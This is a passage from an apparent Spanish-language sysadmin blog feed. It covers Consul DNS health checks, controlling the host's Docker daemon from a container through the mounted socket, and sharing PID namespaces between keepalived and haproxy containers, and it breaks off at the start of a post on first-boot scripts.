    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8002/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, los &lt;em&gt;checks&lt;/em&gt; ligados a servicios son el de web y el de la API. Esto se consigue mediante el parámetro &lt;em&gt;service_id&lt;/em&gt;, que referencia al parámetro &lt;em&gt;id&lt;/em&gt; del servicio.&lt;/p&gt;
&lt;p&gt;Supongamos que el &lt;em&gt;check&lt;/em&gt; del servicio web falla, lo que simularemos parando el servidor web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; atlantis.node.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.15
gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul +short
gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; api.service.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.15
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como podemos apreciar, el servicio web que no está funcionando, no se computa por &lt;strong&gt;consul&lt;/strong&gt; como bueno, por lo que lo quita de las respuestas. Eso no afecta a los otros servicios o al nodo mismo.&lt;/p&gt;
&lt;p&gt;Así pues, si tenemos el servicio en 4 servidores y uno se cae, &lt;strong&gt;consul&lt;/strong&gt; lo sabrá; y por lo tanto, solo va a devolver los 3 que quedan activos. Lo mismo pasa cuando el servicio se recupere.&lt;/p&gt;
&lt;p&gt;Si consumimos directamente este DNS, podemos ahorrarnos un balanceador; cada cliente es responsable de elegir una de las direcciones de la respuesta aleatoriamente.&lt;/p&gt;
&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Teniendo una foto del estado de nuestros servicios, las posibilidades son infinitas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Podemos monitorizar directamente con la interfaz web&lt;/li&gt;
&lt;li&gt;Podemos consumir la API de &lt;strong&gt;consul&lt;/strong&gt; con fines de automatización reactiva (por ejemplo notificando de alguna manera desde un &lt;em&gt;script&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;Podemos limitarnos a usar el DNS&lt;/li&gt;
&lt;li&gt;Incluso podemos generar las configuraciones de un balanceador de forma automática usando la API, aunque eso es otra historia.&lt;/li&gt;
&lt;/ul&gt;</content><category term="consul"></category><category term="service discovery"></category><category term="monitoring"></category></entry><entry><title>Controlando Docker desde un contenedor</title><link href="https://www.linuxsysadmin.ml/2018/04/controlando-docker-desde-un-contenedor.html" rel="alternate"></link><published>2018-04-16T10:00:00+02:00</published><updated>2018-04-16T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-16:/2018/04/controlando-docker-desde-un-contenedor.html</id><summary type="html">&lt;p&gt;Curioso de ver como mucho contenedores eran capaces de ver el contenido &lt;strong&gt;Docker&lt;/strong&gt; de mi servidor, he decidido aprender como se hace, por si me hiciera falta en un futuro. En este artículo intento explicar las lecciones aprendidas, de forma que sean una futura referencia en caso de ser necesario …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Curioso de ver como mucho contenedores eran capaces de ver el contenido &lt;strong&gt;Docker&lt;/strong&gt; de mi servidor, he decidido aprender como se hace, por si me hiciera falta en un futuro. En este artículo intento explicar las lecciones aprendidas, de forma que sean una futura referencia en caso de ser necesario.&lt;/p&gt;
&lt;p&gt;El primer paso para conseguir mi objetivo era tener el binario &lt;code&gt;docker&lt;/code&gt; en un contenedor. Una opción es copiarlo de mi servidor, junto con todas las dependencias; una opción más cuerda es aprovecharme de los paquetes existentes para ello.&lt;/p&gt;
&lt;p&gt;Así pues, vamos a partir de un &lt;em&gt;Alpine Linux&lt;/em&gt;, que por su tamaño, su seguridad y su magnífico gestor de paquetes, se hace el candidato ideal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ cat Dockerfile
FROM alpine:3.7
RUN apk add --no-cache docker &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-proxy &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd-shim &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-runc &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd-ctr &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/dockerd
gerard@atlantis:~/projects/docker-client$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: El paquete &lt;em&gt;docker&lt;/em&gt; en &lt;em&gt;Alpine Linux&lt;/em&gt; ocupa mucho espacio. Esto es debido a que incluye todos los binarios necesarios para ejecutar también el servidor. Como no nos interesa el servidor en un contenedor, los he eliminado.&lt;/p&gt;
&lt;p&gt;Lo construímos para llegar a una imagen adecuada, que vamos a etiquetar &lt;em&gt;docker-client&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ docker build -t docker-client .
Sending build context to Docker daemon  &lt;span class="m"&gt;2&lt;/span&gt;.048kB
...
Successfully built 583d47952c7a
Successfully tagged docker-client:latest
gerard@atlantis:~/projects/docker-client$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
docker-client       latest              583d47952c7a        &lt;span class="m"&gt;7&lt;/span&gt; seconds ago       &lt;span class="m"&gt;30&lt;/span&gt;.2MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.7                 3fd9065eaf02        &lt;span class="m"&gt;4&lt;/span&gt; weeks ago         &lt;span class="m"&gt;4&lt;/span&gt;.15MB
gerard@atlantis:~/projects/docker-client$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La ejecución de un contenedor desde la nueva imagen nos permite usar el comando &lt;code&gt;docker&lt;/code&gt;, aunque los resultados no son los esperados.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ docker run -ti --rm docker-client
/ &lt;span class="c1"&gt;# docker images&lt;/span&gt;
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto es debido a que el cliente de &lt;strong&gt;Docker&lt;/strong&gt; se comunica con el servidor mediante un &lt;em&gt;unix socket&lt;/em&gt; que, al no tener el servicio corriendo, no está creado.&lt;/p&gt;
&lt;p&gt;Como sabemos, &lt;strong&gt;absolutamente todo&lt;/strong&gt; en &lt;em&gt;Linux&lt;/em&gt; es un fichero, y podemos montar ficheros desde el servidor como &lt;em&gt;host volumes&lt;/em&gt;. Por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ docker run -ti --rm -v /var/run/docker.sock:/var/run/docker.sock docker-client
/ &lt;span class="c1"&gt;# docker images&lt;/span&gt;
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
docker-client       latest              583d47952c7a        &lt;span class="m"&gt;5&lt;/span&gt; minutes ago       &lt;span class="m"&gt;30&lt;/span&gt;.2MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.7                 3fd9065eaf02        &lt;span class="m"&gt;4&lt;/span&gt; weeks ago         &lt;span class="m"&gt;4&lt;/span&gt;.15MB
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resultado es que vemos el contenido del servidor &lt;strong&gt;Docker&lt;/strong&gt; del &lt;em&gt;host&lt;/em&gt;, justo como queríamos. Cabe decir que no solo podemos listar las imágenes del &lt;em&gt;host&lt;/em&gt;, sino que podemos controlar el ciclo de vida de un contenedor (&lt;code&gt;docker run&lt;/code&gt;, &lt;code&gt;docker start&lt;/code&gt;, &lt;code&gt;docker restart&lt;/code&gt;, &lt;code&gt;docker stop&lt;/code&gt;) e incluso ejecutar en ellos cosas (&lt;code&gt;docker exec&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Esto va a tener muchas aplicaciones prácticas en el futuro, seguro...&lt;/p&gt;</content><category term="docker"></category><category term="cliente"></category><category term="contenedor"></category></entry><entry><title>Compartiendo Docker namespaces</title><link href="https://www.linuxsysadmin.ml/2018/04/compartiendo-docker-namespaces.html" rel="alternate"></link><published>2018-04-03T10:00:00+02:00</published><updated>2018-04-03T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-03:/2018/04/compartiendo-docker-namespaces.html</id><summary type="html">&lt;p&gt;Como ya sabéis, la tecnología &lt;strong&gt;docker&lt;/strong&gt; me encanta; seguía con mi cruzada para &lt;em&gt;dockerizar&lt;/em&gt; todos mis sistemas, cuando me topé con &lt;a href="https://www.linuxsysadmin.ml/2017/02/alta-disponibilidad-con-keepalived.html"&gt;un artículo antiguo&lt;/a&gt;. En este artículo os contaré los problemas con los que me enfrenté en esta tarea y como los pude superar, explicando lo aprendido en el proceso …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como ya sabéis, la tecnología &lt;strong&gt;docker&lt;/strong&gt; me encanta; seguía con mi cruzada para &lt;em&gt;dockerizar&lt;/em&gt; todos mis sistemas, cuando me topé con &lt;a href="https://www.linuxsysadmin.ml/2017/02/alta-disponibilidad-con-keepalived.html"&gt;un artículo antiguo&lt;/a&gt;. En este artículo os contaré los problemas con los que me enfrenté en esta tarea y como los pude superar, explicando lo aprendido en el proceso.&lt;/p&gt;
&lt;p&gt;No soy fan de meter varios procesos en el mismo contenedor, así que quise intentar una aproximación de varios contenedores, uno por proceso, levantados mediante &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El proceso &lt;em&gt;keepalived&lt;/em&gt; en si mismo no tiene mucha complicación, solo hay que tener en cuenta dos cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Al gestionar una IP flotante del &lt;em&gt;host&lt;/em&gt; el contenedor debe estar en su misma red, con la que vamos a necesitar el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--net=host&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;El otro asunto peliagudo es que un contenedor no puede manejar la parte de redes por permisos, y por lo tanto debe lanzarse con el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--privileged&lt;/code&gt; o con la &lt;em&gt;capability&lt;/em&gt; &lt;code&gt;NET_ADMIN&lt;/code&gt;, que es lo mínimo necesario.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El problema lo tenemos cuando queremos ejecutar el &lt;em&gt;check&lt;/em&gt; de &lt;em&gt;keepalived&lt;/em&gt; referente al proceso hermano &lt;strong&gt;nginx&lt;/strong&gt; o &lt;strong&gt;haproxy&lt;/strong&gt;. Solamente la idea de tener que hacer un &lt;strong&gt;kill&lt;/strong&gt; a un proceso de otro contenedor era suficiente para desistir, ya que los procesos de un contenedor no se ven con los de otro. &lt;strong&gt;¿O si?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;El truco está en el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--pid&lt;/code&gt; que como indica la página de ayuda, gestiona el "PID namespace to use". Esto nos permite ejecutar un contenedor en el espacio de PIDs de otro, de forma que los procesos de ambos contenedores se ven entre sí, aunque solo uno de ellos puede ser el proceso 1 inicial, y la caída de este ocasiona la parada de ambos contenedores.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico: keepalived y haproxy&lt;/h2&gt;
&lt;p&gt;Vamos a hacer un par de instancias de &lt;strong&gt;keepalived&lt;/strong&gt; en dos &lt;em&gt;hosts&lt;/em&gt; distintos, y cada uno de ellos también va a tener un &lt;strong&gt;haproxy&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;Las imágenes&lt;/h3&gt;
&lt;p&gt;La imagen de &lt;strong&gt;keepalived&lt;/strong&gt; no tiene misterios; cualquier sistema operativo con &lt;strong&gt;keepalived&lt;/strong&gt; instalado nos vale. Adicionalmente, lo vamos a iniciar mediante un &lt;em&gt;script&lt;/em&gt; que va a generar la configuración, en base a unas variables de entorno, que nos van a servir para discernir entre las configuraciones del &lt;em&gt;master&lt;/em&gt; y del &lt;em&gt;slave&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ cat keepalived/Dockerfile
FROM alpine:3.7
RUN apk add --no-cache keepalived
COPY start.sh /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/projects/ha-loadbalancer$ cat keepalived/start.sh
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;\&lt;/span&gt;
&lt;span class="s2"&gt;vrrp_script chk_&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; {&lt;/span&gt;
&lt;span class="s2"&gt;      script \&amp;quot;/bin/busybox killall -0 &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;\&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;      interval &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CHECK_INTERVAL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      weight &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CHECK_WEIGHT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;

&lt;span class="s2"&gt;vrrp_instance VI_1 {&lt;/span&gt;
&lt;span class="s2"&gt;      interface &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;INTERFACE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      state &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;STATE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      virtual_router_id &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ROUTER&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      priority &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PRIORITY&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      virtual_ipaddress {&lt;/span&gt;
&lt;span class="s2"&gt;           &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIP&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      }&lt;/span&gt;
&lt;span class="s2"&gt;      track_script {&lt;/span&gt;
&lt;span class="s2"&gt;           chk_&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&lt;/span&gt;
&lt;span class="s2"&gt;      }&lt;/span&gt;
&lt;span class="s2"&gt;}&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &amp;gt; /etc/keepalived/keepalived.conf

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/keepalived -l -n
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construiremos la imagen bajo el &lt;em&gt;tag&lt;/em&gt; &lt;code&gt;sirrtea/keepalived:alpine&lt;/code&gt; para su uso futuro.&lt;/p&gt;
&lt;p&gt;La imagen de &lt;strong&gt;haproxy&lt;/strong&gt; no es especial, y podemos utilizar cualquiera que ya tengamos, por ejemplo, &lt;a href="https://hub.docker.com/r/sirrtea/haproxy/"&gt;esta&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Desplegando las imágenes&lt;/h3&gt;
&lt;p&gt;Por comodidad, vamos a utilizar &lt;strong&gt;docker-compose&lt;/strong&gt; que levante el conjunto de &lt;strong&gt;kepalived&lt;/strong&gt; y &lt;strong&gt;haproxy&lt;/strong&gt;, uno en cada &lt;em&gt;host&lt;/em&gt;. Es importante recalcar que la directiva &lt;code&gt;pid&lt;/code&gt; solo funciona con la versión 2.1 o superior de &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Vamos a levantar el &lt;strong&gt;nginx&lt;/strong&gt; en el &lt;em&gt;namespace&lt;/em&gt; de &lt;strong&gt;keepalived&lt;/strong&gt;. esto se hace así porque &lt;strong&gt;keepalived&lt;/strong&gt; no se va a caer y puede comprobar si el &lt;strong&gt;haproxy&lt;/strong&gt; está corriendo o no. De hacerlo al revés, la caída del &lt;strong&gt;haproxy&lt;/strong&gt; (que sería el PID 1), causaría el fin del contenedor, y la parada de todos los procesos del &lt;em&gt;namespace&lt;/em&gt;, incluyendo &lt;strong&gt;keepalived&lt;/strong&gt;. Esto que haría que el &lt;em&gt;check&lt;/em&gt; del servicio &lt;strong&gt;haproxy&lt;/strong&gt; no sirviera de nada.&lt;/p&gt;
&lt;h4&gt;El host master&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ cat master/docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2.1&amp;#39;&lt;/span&gt;
services:
  keepalived:
    image: sirrtea/keepalived:alpine
    container_name: keepalived
    hostname: keepalived
    environment:
      SERVICE: haproxy
      CHECK_INTERVAL: &lt;span class="m"&gt;2&lt;/span&gt;
      CHECK_WEIGHT: &lt;span class="m"&gt;2&lt;/span&gt;
      INTERFACE: enp0s3
      STATE: MASTER
      VIRTUAL_ROUTER: &lt;span class="m"&gt;51&lt;/span&gt;
      PRIORITY: &lt;span class="m"&gt;11&lt;/span&gt;
      VIP: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
    network_mode: host
    cap_add:
      - NET_ADMIN
  haproxy:
    image: sirrtea/haproxy:alpine
    container_name: haproxy
    hostname: haproxy
    pid: &lt;span class="s2"&gt;&amp;quot;service:keepalived&amp;quot;&lt;/span&gt;
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:8080&amp;quot;&lt;/span&gt;
    depends_on:
      - keepalived
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este &lt;em&gt;docker-compose.yml&lt;/em&gt; podemos ver varias cosas interesantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;En el servicio &lt;em&gt;keepalived&lt;/em&gt;:&lt;ul&gt;
&lt;li&gt;Unas variables de entorno que solo sirven para generar la configuración de &lt;strong&gt;keepalived&lt;/strong&gt;, tal como se hace en el &lt;em&gt;script&lt;/em&gt; &lt;code&gt;start.sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;La directiva &lt;code&gt;network_mode: host&lt;/code&gt; que sirve para que el contenedor use la red del &lt;em&gt;host&lt;/em&gt;, pudiendo manejar sus direcciones IP&lt;/li&gt;
&lt;li&gt;La directiva &lt;code&gt;cap_add: NET_ADMIN&lt;/code&gt;, que es la &lt;em&gt;capability&lt;/em&gt; mínima y necesaria para que el contenedor pueda modificar las configuraciones de red&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;En el servicio &lt;em&gt;haproxy&lt;/em&gt;:&lt;ul&gt;
&lt;li&gt;La directiva &lt;code&gt;pid&lt;/code&gt; que nos permite estar en el &lt;em&gt;namespace&lt;/em&gt; de &lt;em&gt;keepalived&lt;/em&gt;, para que sus procesos se vean entre sí&lt;/li&gt;
&lt;li&gt;La directiva &lt;code&gt;depends_on&lt;/code&gt;, de forma que se tenga que levantar primero &lt;em&gt;keepalived&lt;/em&gt;; de lo contrario, no podríamos estar en su &lt;em&gt;namespace&lt;/em&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;El host slave&lt;/h4&gt;
&lt;p&gt;El truco es el mismo, pero teniendo en cuenta que la configuración de &lt;strong&gt;keepalived&lt;/strong&gt; es un poco distinta. Eso lo conseguimos cambiando las variables de entorno que la genera.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ cat slave/docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;2.1&amp;#39;&lt;/span&gt;
services:
  keepalived:
    image: sirrtea/keepalived:alpine
    container_name: keepalived
    hostname: keepalived
    environment:
      SERVICE: haproxy
      CHECK_INTERVAL: &lt;span class="m"&gt;2&lt;/span&gt;
      CHECK_WEIGHT: &lt;span class="m"&gt;2&lt;/span&gt;
      INTERFACE: enp0s3
      STATE: BACKUP
      VIRTUAL_ROUTER: &lt;span class="m"&gt;51&lt;/span&gt;
      PRIORITY: &lt;span class="m"&gt;10&lt;/span&gt;
      VIP: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
    network_mode: host
    cap_add:
      - NET_ADMIN
  haproxy:
    image: sirrtea/haproxy:alpine
    container_name: haproxy
    hostname: haproxy
    pid: &lt;span class="s2"&gt;&amp;quot;service:keepalived&amp;quot;&lt;/span&gt;
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:8080&amp;quot;&lt;/span&gt;
    depends_on:
      - keepalived
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los cambios son las variables de entorno &lt;code&gt;STATE&lt;/code&gt; y &lt;code&gt;PRIORITY&lt;/code&gt; en el servicio &lt;em&gt;keepalived&lt;/em&gt;; el resto se mantiene igual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ diff master/docker-compose.yml slave/docker-compose.yml
12c12
&amp;lt;       STATE: MASTER
---
&amp;gt;       STATE: BACKUP
14c14
&amp;lt;       PRIORITY: &lt;span class="m"&gt;11&lt;/span&gt;
---
&amp;gt;       PRIORITY: &lt;span class="m"&gt;10&lt;/span&gt;
gerard@atlantis:~/projects/ha-loadbalancer$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría desplegar ambos &lt;em&gt;docker-compose.yml&lt;/em&gt; cada uno en un &lt;em&gt;host&lt;/em&gt; distinto y ver que funciona como debe.&lt;/p&gt;</content><category term="docker"></category><category term="namespaces"></category><category term="keepalived"></category><category term="haproxy"></category></entry><entry><title>Configurando servidores con first time boot scripts</title><link href="https://www.linuxsysadmin.ml/2018/02/configurando-servidores-con-first-time-boot-scripts.html" rel="alternate"></link><published>2018-02-26T10:00:00+01:00</published><updated>2018-02-26T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-02-26:/2018/02/configurando-servidores-con-first-time-boot-scripts.html</id><summary type="html">&lt;p&gt;Configurar servidores desde cero es una tarea muy pesada, una fuente de errores innecesaria y hace nuestros servidores difícilmente reproducibles. Los &lt;em&gt;setups&lt;/em&gt; más básicos son siempre los mismos, y podemos configurar nuestros servidores para que ejecuten un &lt;em&gt;script&lt;/em&gt; la primera vez que se (re)inicien, a falta de mejores herramientas …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Configurar servidores desde cero es una tarea muy pesada, una fuente de errores innecesaria y hace nuestros servidores difícilmente reproducibles. Los &lt;em&gt;setups&lt;/em&gt; más básicos son siempre los mismos, y podemos configurar nuestros servidores para que ejecuten un &lt;em&gt;script&lt;/em&gt; la primera vez que se (re)inicien, a falta de mejores herramientas.&lt;/p&gt;
&lt;p&gt;De esta forma, podemos disponer fácilmente de un servidor de un tipo predefinido, especialmente en aquellos &lt;em&gt;hostings&lt;/em&gt; que nos permitan &lt;em&gt;scripts&lt;/em&gt; de inicialización, como por ejemplo, &lt;a href="https://www.vultr.com/?ref=7251515"&gt;Vultr&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;El truco consiste en hacer que nuestro sistema de &lt;em&gt;init&lt;/em&gt; ejecute nuestro &lt;em&gt;script&lt;/em&gt;, solamente en el caso de que no se haya ejecutado ya. Para ello podemos usar el mismo fichero de &lt;em&gt;log&lt;/em&gt; de la ejecución efectuada.&lt;/p&gt;
&lt;h2&gt;Un ejemplo con systemd&lt;/h2&gt;
&lt;p&gt;De acuerdo a la documentación de &lt;strong&gt;systemd&lt;/strong&gt;, existe un fichero que se ejecuta en cada &lt;em&gt;boot&lt;/em&gt;, suponiendo que exista y que tenga los permisos adecuados. Se trata de &lt;em&gt;/etc/rc.local&lt;/em&gt;. Nos bastaría con crearlo y asignarle permisos de ejecución, y tendríamos el &lt;em&gt;script&lt;/em&gt; ejecutándose en cada &lt;em&gt;boot&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;El lanzador&lt;/h3&gt;
&lt;p&gt;Con un poco de lógica, podemos hacer lo sugerido: un &lt;em&gt;script&lt;/em&gt; que ejecute algo y genere el &lt;em&gt;log&lt;/em&gt; para que no se vuelva a ejecutar de nuevo. Sin embargo, parece adecuado disponer de un &lt;em&gt;framework&lt;/em&gt; que separe la lógica de ejecución, del &lt;em&gt;script&lt;/em&gt; ejecutado.&lt;/p&gt;
&lt;p&gt;Esto nos permite distribuir nuestras imágenes base con el &lt;em&gt;script&lt;/em&gt; y dejar al usuario la opción de poner o no un &lt;em&gt;script&lt;/em&gt; de inicialización, y de que poner en él. Así pues, un posible ejemplo sería este:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@firstboot:~# cat /etc/rc.local
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nv"&gt;SCRIPT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/firstboot.sh
&lt;span class="nv"&gt;LOG&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/root/firstboot.log

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -x &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SCRIPT&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
